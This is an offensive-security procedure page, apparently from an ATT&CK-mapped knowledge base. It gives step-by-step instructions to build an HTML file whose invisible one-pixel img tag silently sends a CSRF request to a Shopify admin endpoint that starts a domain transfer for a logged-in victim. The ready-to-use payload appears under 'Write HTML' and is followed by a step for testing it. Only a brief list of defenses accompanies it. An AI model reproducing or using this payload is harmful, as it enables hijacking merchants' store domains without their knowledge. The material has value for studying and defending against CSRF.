---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
tags:
  - csrf
  - html-payload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:42.866Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-HTML-for-CSRF-Payload

## Summary

Create an HTML file embedding the modified transfer URL in an img tag to automatically trigger the CSRF request when opened.

## Description

The img tag exploits browser behavior to make a cross-origin GET request to the vulnerable endpoint without user interaction, initiating the domain transfer if the victim is logged in. This bypasses Shopify's missing CSRF protections.

## Requirements

1. Modified URL from previous step
2. Text editor (e.g., Notepad, VS Code)
3. Basic HTML knowledge

## Defense

Defensive measures and detection strategies:

- Add CSRF tokens to all endpoints, even GET
- Content-Security-Policy to block inline img src
- Browser extensions for CSRF detection

## Objectives

1. Embed URL in non-interactive element
2. Ensure automatic request on load
3. Save as deliverable file

## Instructions

### Step 1: Write HTML

**Context**: Construct the file to trigger the request.

Create `csrf.html` with:

```html
<!DOCTYPE html>
<html><body><img src="https://victimstore.myshopify.com/admin/settings/domains/initiate_inter_shop_domain_transfer?transfer_code=6fa6d18a-d2d1-4114-b11e-236b20f81398" width="1" height="1"></body></html>
```

> Expected: Minimal HTML that loads invisibly.

### Step 2: Test Locally

**Context**: Verify the img src triggers without errors.

Open `csrf.html` in browser (logged into test store); check network tab for request.

> Expected: GET request to endpoint succeeds.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[csrf]]
- [[drive-by]]
